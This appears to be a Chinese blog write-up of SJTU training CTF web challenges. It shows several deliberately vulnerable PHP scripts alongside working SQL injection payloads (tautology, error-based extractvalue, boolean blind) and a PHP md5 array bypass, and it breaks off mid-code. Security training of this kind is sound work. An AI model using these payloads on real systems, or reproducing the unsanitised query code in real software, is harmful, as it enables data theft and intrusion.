<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SJTU-OJ-WEB | cheng_xing's blog</title><meta name="robots" content="noindex"><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hidden flag第一段flag在页面元素里 1&lt;!--- flag_part1:0ops&#123;ctf_web_i--&gt;  第二段在网络请求的响应头里 1Flag_part2: s_so_eas  第三段flag在cookie里 1flag_part3&#x3D;y_23333&#125;   0ops{ctf_web_is_so_easy_23333}  sqli - warmup1">
<meta property="og:type" content="article">
<meta property="og:title" content="SJTU-OJ-WEB">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/07/24/SJTU-OJ-WEB/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="hidden flag第一段flag在页面元素里 1&lt;!--- flag_part1:0ops&#123;ctf_web_i--&gt;  第二段在网络请求的响应头里 1Flag_part2: s_so_eas  第三段flag在cookie里 1flag_part3&#x3D;y_23333&#125;   0ops{ctf_web_is_so_easy_23333}  sqli - warmup1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-07-23T16:27:58.000Z">
<meta property="article:modified_time" content="2025-09-23T11:59:59.413Z">
<meta property="article:author" content="cheng_xing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SJTU-OJ-WEB",
  "url": "https://sakuraraindrop.github.io/2025/07/24/SJTU-OJ-WEB/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-07-23T16:27:58.000Z",
  "dateModified": "2025-09-23T11:59:59.413Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/07/24/SJTU-OJ-WEB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SJTU-OJ-WEB',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SJTU-OJ-WEB</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SJTU-OJ-WEB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-23T16:27:58.000Z" title="发表于 2025-07-24 00:27:58">2025-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-23T11:59:59.413Z" title="更新于 2025-09-23 19:59:59">2025-09-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="hidden-flag"><a href="#hidden-flag" class="headerlink" title="hidden flag"></a>hidden flag</h2><p>第一段flag在页面元素里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--- flag_part1:0ops&#123;ctf_web_i--&gt;</span><br></pre></td></tr></table></figure>

<p>第二段在网络请求的响应头里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag_part2: s_so_eas</span><br></pre></td></tr></table></figure>

<p>第三段flag在cookie里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_part3=y_23333&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{ctf_web_is_so_easy_23333}</p>
</blockquote>
<h2 id="sqli-warmup"><a href="#sqli-warmup" class="headerlink" title="sqli - warmup"></a>sqli - warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT whatsup FROM warmup WHERE user=&#x27;<span class="subst">$user</span>&#x27; and pass=&#x27;<span class="subst">$pass</span>&#x27; LIMIT 1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rows</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$rows</span>);</span><br></pre></td></tr></table></figure>

<p>无任何过滤字符型注入</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=1%27or%20%271%27=%271&amp;pass=1%27or%20%271%27=%271</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{af60db027d1055766879d866a51a2c7d}</p>
</blockquote>
<h2 id="sqli-error-injection"><a href="#sqli-error-injection" class="headerlink" title="sqli - error injection"></a>sqli - error injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$id</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT whatsup FROM error WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$con</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rows</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$con</span>-&gt;error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">ctf</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),0x7e)) --+</span><br><span class="line">error</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;error&#x27;),0x7e)) --+</span><br><span class="line">id,user,pass,whatsup</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(substr((select whatsup from error),1,32)),0x7e)) --+</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(substr((select whatsup from error),32,64)),0x7e)) --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{731d7ad7d29cfa91803bb7ce6065daea}</p>
</blockquote>
<h2 id="sqli-bool-injection"><a href="#sqli-bool-injection" class="headerlink" title="sqli - bool injection"></a>sqli - bool injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT whatsup FROM `bool` WHERE user=&#x27;<span class="subst">$user</span>&#x27; and pass=&#x27;<span class="subst">$pass</span>&#x27; LIMIT 1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rows</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">?user=1&#x27;or+&#x27;1&#x27;=&#x27;1&amp;pass=1&#x27;or+left(database(),3)&gt;&#x27;cte&#x27;--+</span><br><span class="line">ctf</span><br><span class="line"></span><br><span class="line">表名 §§表示爆破位置</span><br><span class="line">?user=1&#x27;or+&#x27;1&#x27;=&#x27;1&amp;pass=1&#x27;or+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),§1§,1))=§110§--+</span><br><span class="line">bool</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">?user=1&#x27;or+&#x27;1&#x27;=&#x27;1&amp;pass=1&#x27;or+ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;bool&#x27;),§1§,1))=§110§--+</span><br><span class="line">id,user,pass,whatsup</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">?user=1&#x27;or+&#x27;1&#x27;=&#x27;1&amp;pass=1&#x27;or+ascii(substr((select+whatsup+from+bool),§1§,1))=§110§--+</span><br><span class="line">0ops&#123;97614920ff5623417ef6add2b2b51b86&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{97614920ff5623417ef6add2b2b51b86}</p>
</blockquote>
<h2 id="sqli-orderby"><a href="#sqli-orderby" class="headerlink" title="sqli - orderby"></a>sqli - orderby</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;connect.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$order</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM orderby order by <span class="subst">$order</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rows</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sqlmap一把梭了</p>
<blockquote>
<p>0ops{a3008665f7a4e5baa3080a739ef95c13}</p>
</blockquote>
<h2 id="bypass-addslashes"><a href="#bypass-addslashes" class="headerlink" title="bypass addslashes?"></a>bypass addslashes?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;connect.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM preg WHERE name=&#x27;admin&#x27; and pass=&#x27;&#123;pass&#125;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&#123;pass&#125;/&quot;</span>, <span class="variable">$pass</span>, <span class="variable">$query</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;whatsup&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>




<h2 id="php-tricks-weak-type"><a href="#php-tricks-weak-type" class="headerlink" title="php tricks - weak type"></a>php tricks - weak type</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$user</span> &amp;&amp; <span class="variable">$pass</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="variable">$pass</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>一眼md5弱比较，直接数组绕过</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user[]=1&amp;pass[]=2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{614510f9153277f0736810de5b1cdfbd}</p>
</blockquote>
<h2 id="php-tricks-magic-hash"><a href="#php-tricks-magic-hash" class="headerlink" title="php tricks - magic hash"></a>php tricks - magic hash</h2><p>sha1弱比较</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span 